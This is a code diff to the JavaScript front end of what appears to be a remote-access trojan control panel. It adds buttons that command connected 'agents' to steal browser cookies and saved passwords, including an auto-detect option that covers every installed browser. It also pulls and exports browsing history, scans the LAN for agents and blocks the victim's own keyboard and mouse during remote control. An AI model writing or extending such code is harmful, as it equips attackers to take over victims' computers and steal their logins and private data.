@@ -17,6 +17,7 @@ import { renderScanList } from './modules/scanner.js';
 import { clearWebcamStreamUI } from './modules/webcam.js';
 import { initChat, resetChat } from './modules/chat.js';
 import { initWifiManager, requestWifiScan } from './modules/wifi.js';
+import { closeHistoryModal, exportHistoryCSV } from './modules/stealer.js';
 
 document.addEventListener('DOMContentLoaded', () => {
 
@@ -103,13 +104,130 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // --- Stealer ---
     window.requestStealCookies = (browser) => {
+        if (!canUseAgentFeature()) return;
+        closeBrowserSelector();
         sendWsMessage({ command: 'steal_cookies_cdp', browser: browser });
     };
 
     window.requestStealPass = (browser) => {
         if (!canUseAgentFeature()) return;
+        closeBrowserSelector();
         sendWsMessage({ command: 'steal_credentials', browser });
     };
+
+    window.requestAutoStealPasswords = () => {
+        if (!canUseAgentFeature()) return;
+        closeBrowserSelector();
+        sendWsMessage({ command: 'steal_passwords_auto' });
+    };
+
+    window.requestBrowserList = () => {
+        if (!canUseAgentFeature()) return;
+        sendWsMessage({ command: 'get_browser_list' });
+    };
+
+    window.requestBrowserHistory = (browser) => {
+        if (!canUseAgentFeature()) return;
+        closeBrowserSelector();
+        sendWsMessage({ command: 'get_browser_history', browser: browser });
+    };
+
+    // --- Browser Selector Modal ---
+    const browserData = [
+        { id: 'chrome', name: 'Chrome', icon: 'chrome', gradient: 'linear-gradient(135deg, #fce38a, #f38181)' },
+        { id: 'edge', name: 'Edge', icon: 'globe', gradient: 'linear-gradient(135deg, #00c6ff, #0072ff)' },
+        { id: 'brave', name: 'Brave', icon: 'shield', gradient: 'linear-gradient(135deg, #ff512f, #dd2476)' },
+        { id: 'coccoc', name: 'Cốc Cốc', icon: 'compass', gradient: 'linear-gradient(135deg, #4ade80, #22c55e)' },
+        { id: 'opera', name: 'Opera', icon: 'circle', gradient: 'linear-gradient(135deg, #ff416c, #ff4b2b)' },
+        { id: 'firefox', name: 'Firefox', icon: 'compass', gradient: 'linear-gradient(135deg, #ff6b35, #f7931e)' },
+    ];
+
+    window.openBrowserSelector = (featureType) => {
+        if (!canUseAgentFeature()) return;
+        
+        const modal = $('#browser-selector-modal');
+        const title = $('#browser-selector-title');
+        const grid = $('#browser-grid');
+        
+        let titleText = 'Select Browser';
+        let titleIcon = 'chrome';
+        
+        if (featureType === 'cookies') {
+            titleText = '🍪 Extract Cookies';
+            titleIcon = 'globe';
+        } else if (featureType === 'passwords') {
+            titleText = '🔑 Extract Passwords';
+            titleIcon = 'key';
+        } else if (featureType === 'history') {
+            titleText = '📜 Extract History';
+            titleIcon = 'clock';
+        }
+        
+        title.innerHTML = `<i data-feather="${titleIcon}"></i> ${titleText}`;
+        
+        // Build browser cards
+        let html = '';
+        
+        // Auto-detect option for passwords
+        if (featureType === 'passwords') {
+            html += `
+                <div class="browser-card auto-detect" onclick="requestAutoStealPasswords()">
+                    <div class="browser-icon" style="background: linear-gradient(135deg, #8b5cf6, #6366f1);">
+                        <i data-feather="zap"></i>
+                    </div>
+                    <div class="browser-info">
+                        <div class="browser-name">⚡ Auto Detect All Browsers</div>
+                        <div class="browser-desc">Automatically scan and extract from all installed browsers</div>
+                    </div>
+                </div>
+            `;
+        }
+        
+        // Individual browser options
+        const browsers = featureType === 'cookies' 
+            ? browserData.filter(b => ['chrome', 'edge', 'brave', 'coccoc'].includes(b.id))
+            : browserData;
+            
+        browsers.forEach(b => {
+            let onclick = '';
+            if (featureType === 'cookies') onclick = `requestStealCookies('${b.id}')`;
+            else if (featureType === 'passwords') onclick = `requestStealPass('${b.id}')`;
+            else if (featureType === 'history') onclick = `requestBrowserHistory('${b.id}')`;
+            
+            html += `
+                <div class="browser-card" onclick="${onclick}">
+                    <div class="browser-icon" style="background: ${b.gradient};">
+                        <i data-feather="${b.icon}"></i>
+                    </div>
+                    <div class="browser-name">${b.name}</div>
+                </div>
+            `;
+        });
+        
+        grid.innerHTML = html;
+        $('#browser-selector-backdrop')?.classList.remove('hidden');
+        modal.classList.remove('hidden');
+        if (typeof feather !== 'undefined') feather.replace();
+    };
+
+    window.closeBrowserSelector = () => {
+        $('#browser-selector-modal')?.classList.add('hidden');
+        $('#browser-selector-backdrop')?.classList.add('hidden');
+    };
+
+    // Close modal when clicking backdrop
+    $('#browser-selector-backdrop')?.addEventListener('click', () => closeBrowserSelector());
+
+    // --- History Modal ---
+    window.closeHistoryModal = closeHistoryModal;
+    window.exportHistoryCSV = exportHistoryCSV;
+    
+    $('#btn-export-history')?.addEventListener('click', exportHistoryCSV);
+    
+    // Close history modal when clicking overlay
+    $('#history-modal')?.addEventListener('click', (e) => {
+        if (e.target.id === 'history-modal') closeHistoryModal();
+    });
 
     // --- File Manager ---
     window.onTreeToggle = (e, toggleBtn, path) => {
@@ -289,6 +407,21 @@ document.addEventListener('DOMContentLoaded', () => {
         }
         const btnScan = $('#btn-scan-lan');
         if (btnScan) btnScan.classList.remove('active-scan');
+        // Dừng beacon khi đóng modal
+        fetch(`${location.protocol}//${location.host}/api/stop-scan`, { method: 'POST' }).catch(() => {});
+    };
+
+    // Gọi API để bắt đầu gửi beacon broadcast
+    const startBeaconScan = async () => {
+        try {
+            await fetch(`${location.protocol}//${location.host}/api/start-scan`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ duration: 15000 }) // Scan trong 15 giây
+            });
+        } catch (error) {
+            console.error("Failed to start beacon scan:", error);
+        }
     };
 
     const fetchScanList = async () => {
@@ -358,6 +491,8 @@ document.addEventListener('DOMContentLoaded', () => {
         btnScanLan.onclick = () => {
             btnScanLan.classList.add('active-scan');
             showModal('modal-scan-lan');
+            // Bắt đầu gửi beacon broadcast để tìm agent
+            startBeaconScan();
             fetchScanList();
             if (state.scanInterval) clearInterval(state.scanInterval);
             state.scanInterval = setInterval(fetchScanList, 2000);
@@ -467,6 +602,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Mouse & Keyboard Control
     const controlToggle = $('#toggle-control');
+    const blockInputToggle = $('#toggle-block-input');
     const streamImg = $('#stream-video');
 
     streamImg.addEventListener('dragstart', (e) => {
@@ -484,9 +620,31 @@ document.addEventListener('DOMContentLoaded', () => {
             if (e.target.checked) {
                 streamImg.classList.add('controlling');
                 window.focus();
+                // Enable Block Input toggle when Control is enabled
+                if (blockInputToggle) blockInputToggle.disabled = false;
             }
             else {
                 streamImg.classList.remove('controlling');
+                // Disable and uncheck Block Input when Control is disabled
+                if (blockInputToggle) {
+                    if (blockInputToggle.checked) {
+                        // Auto-unblock when disabling control
+                        sendWsMessage({ command: 'unblock_input' });
+                    }
+                    blockInputToggle.checked = false;
+                    blockInputToggle.disabled = true;
+                }
+            }
+        };
+    }
+
+    // Block Input Toggle Handler
+    if (blockInputToggle) {
+        blockInputToggle.onclick = (e) => {
+            if (e.target.checked) {
+                sendWsMessage({ command: 'block_input' });
+            } else {
+                sendWsMessage({ command: 'unblock_input' });
             }
         };
     }
